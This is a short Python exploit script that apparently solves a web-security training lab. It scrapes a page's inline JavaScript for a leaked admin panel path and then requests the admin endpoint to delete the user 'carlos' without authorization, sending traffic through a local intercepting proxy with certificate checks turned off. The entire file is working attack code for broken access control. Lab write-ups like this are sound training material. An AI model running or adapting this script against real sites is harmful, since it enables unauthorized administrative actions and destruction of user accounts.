#!/usr/bin/env python3

import requests
import sys
from requests import cookies
import urllib3
from bs4 import BeautifulSoup as bs

# disable insecure request warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# function to find all script tags in the page (we know from solving the lab)
def find_scripts(url):

    # to complete this lab we need a session cookie
    session = requests.session()
    response = session.get(url, verify=False)
    cookies = requests.utils.dict_from_cookiejar(response.cookies)
    data = bs(response.text, "html.parser")
    scripts = data.find_all('script')

    # loop through scripts and find the isAdmin variable
    # the 're' library would be better for this, but for a simple lab this works
    # .... but seriously, I should have used 're'
    for s in scripts:
        if 'var isAdmin' in s.text:
            # print(s.text)
            script = s.text.split(';')
            admin_endpoint = script[3].split(', ')
            admin_endpoint = admin_endpoint[1].strip(')')
            
            # bunch of non-sense to format the endpoint correctly and craft the final admin url
            admin_url = url + admin_endpoint.strip('\'')

            delete_carlos(admin_url, session, cookies)


# we'll take in the session and cookie as additional params for this function so we don't have to repeat ourselves
def delete_carlos(url, session, cookies):
    # GET /admin-zz5o4u/delete?username=carlos
    delete_url = url + '/delete?username=carlos'

    # send get request to delete carlos
    response = session.get(delete_url, verify=False, proxies=proxies, cookies=cookies)
    # print(delete_url)  # sanity check

    if response.status_code == 200:
        print('Carlos has been deleted!')
    else:
        print('Try again!')


def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} <url>')
        sys.exit(1)

    else:
        url = sys.argv[1]
        find_scripts(url)


if __name__ == "__main__":
    main()
